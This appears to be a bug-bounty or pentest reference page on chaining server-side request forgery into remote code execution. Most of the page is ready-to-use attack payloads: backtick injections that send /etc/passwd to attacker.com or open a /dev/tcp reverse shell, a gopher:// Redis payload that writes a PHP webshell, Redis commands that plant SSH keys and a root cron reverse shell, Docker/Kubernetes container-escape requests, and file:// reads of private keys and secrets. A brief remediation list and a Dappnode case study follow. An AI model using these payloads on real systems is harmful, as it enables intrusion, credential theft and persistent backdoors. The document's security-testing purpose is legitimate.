# SSRF to RCE — Chaining for Maximum Impact

**Category:** SSRF  
**Severity:** Critical  
**CWE:** CWE-918 → CWE-78 (OS Command Injection)  
**Last Updated:** 2026-02-03  
**Author:** Ghost 👻

---

## Attack Pattern

SSRF alone proves network access. Chaining SSRF with command injection, Redis exploitation, or internal service abuse escalates to Remote Code Execution (RCE). This pattern earns the highest bug bounty payouts ($4,000–$50,000+).

---

## Chain Techniques

### 1. SSRF + Command Injection (Backtick Evaluation)

When the server evaluates the SSRF target as part of a shell command (e.g., using the hostname in a DNS lookup or curl), backtick injection achieves RCE.

**Attack Flow:**
```
# Server processes: curl http://[USER_INPUT]/migration
# Inject backtick command:
USER_INPUT = `whoami`.attacker.com

# Server executes: curl http://`whoami`.attacker.com/migration
# Resolves to: curl http://www-data.attacker.com/migration
# Attacker sees DNS query for www-data.attacker.com → confirms RCE
```

**Escalation to shell:**
```
# Read files via callback
`curl -F '@/etc/passwd attacker.com'`.attacker.com

# Write files
`echo 'ssh-rsa AAAA...' >> /home/user/.ssh/authorized_keys`.attacker.com

# Full reverse shell
`bash -i >& /dev/tcp/attacker.com/4444 0>&1`.attacker.com
```

**Real-World:** $4,000 bounty — file-sharing app migration wizard. Researcher escalated from SSRF → command injection → SSH key injection → root shell. (thehackerish writeup)

---

### 2. SSRF + Redis (gopher:// Protocol)

Redis on default port 6379 with no auth is extremely common in internal networks. Using `gopher://` protocol, SSRF can send arbitrary Redis commands.

**Attack Flow:**
```
# Write webshell via Redis
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a<?php system($_GET['cmd']); ?>%0d%0a
*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a
*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a
*1%0d%0a$4%0d%0asave%0d%0a

# This writes a PHP webshell to /var/www/html/shell.php
# Access: http://target.com/shell.php?cmd=id
```

**Alternative Redis exploitation:**
```
# Write SSH key via Redis
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET key "ssh-rsa AAAA... attacker@kali"
SAVE

# Write crontab
CONFIG SET dir /var/spool/cron/crontabs
CONFIG SET dbfilename root
SET key "\n\n* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
SAVE
```

---

### 3. SSRF + Internal APIs (Docker/Kubernetes)

**Docker API (port 2375):**
```
# List containers
SSRF → http://127.0.0.1:2375/containers/json

# Create container with host mount
POST http://127.0.0.1:2375/containers/create
{"Image":"alpine","Cmd":["sh"],"Binds":["/:/host"],"Tty":true}

# Start container, exec into it → host filesystem access
```

**Kubernetes API (port 10250):**
```
# List pods
SSRF → https://127.0.0.1:10250/pods

# Execute command in pod
SSRF → https://127.0.0.1:10250/run/[namespace]/[pod]/[container]
POST body: cmd=id
```

---

### 4. SSRF + Elasticsearch (port 9200)

```
# Dump all indices
SSRF → http://127.0.0.1:9200/_cat/indices

# Read sensitive data
SSRF → http://127.0.0.1:9200/users/_search?pretty=true&q=*:*

# Write Groovy script for RCE (older versions)
SSRF → http://127.0.0.1:9200/_search?source={"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"java.lang.Runtime.getRuntime().exec('id')"}}}
```

---

### 5. SSRF + URL Scheme Exploitation

**file:// protocol:**
```
?url=file:///etc/passwd
?url=file:///proc/self/environ  # Environment variables (may contain secrets)
?url=file:///proc/self/cmdline  # Running process command line
?url=file:///root/.ssh/id_rsa   # SSH private keys
?url=file:///app/.env           # Application secrets
```

**dict:// protocol:**
```
?url=dict://127.0.0.1:6379/INFO  # Redis info
?url=dict://127.0.0.1:11211/stats  # Memcached stats
```

---

## Exploitation Methodology

```
1. Confirm SSRF (basic localhost access)
     ↓
2. Enumerate internal ports (timing or error-based)
     ↓
3. Identify internal services (Redis, Docker, K8s, ES, etc.)
     ↓
4. Test URL scheme support (file://, gopher://, dict://)
     ↓
5. Chain for maximum impact:
   - Cloud metadata → credential theft
   - Redis → webshell / SSH key
   - Docker/K8s API → container escape
   - Command injection → reverse shell
     ↓
6. Document full chain with PoC
```

---

## Remediation

1. **Strip non-HTTP(S) schemes**: Block `gopher://`, `file://`, `dict://`, `ftp://`
2. **Authenticate internal services**: Redis AUTH, Docker TLS, K8s RBAC
3. **Network segmentation**: Web tier should not reach database/cache tier directly
4. **Sanitize shell inputs**: Never interpolate user input into shell commands
5. **Container hardening**: Don't expose Docker socket, use read-only filesystems

---

## Web3 Relevance — Dappnode Case Study

NetSpi (2024) found multiple 0-days in **Dappnode**, a popular Ethereum node management framework:

**Chain:** Pre-auth XSS (via IPFS proxy) → Post-auth Command Injection → Docker Socket Access → Host Root Shell

- Dappnode's IPFS proxy served user-uploaded content at `my.dappnode/ipfs/[CID]` without validation
- XSS payload uploaded to IPFS, served from trusted domain
- Forced authenticated operator's browser to trigger command injection in Dappmanager API
- Dappmanager container had Docker socket mount → container escape → root on host
- **Impact:** Single malicious link → full Ethereum node takeover
- **Also found:** WireGuard VPN config exfiltration (LFI + permissive CORS)
- **Remediated:** DappManager v0.2.82+

**Lesson for Zealynx:** When pentesting Web3 infrastructure, always check node management tools. Most validators/nodes use containerized setups with privileged API access.
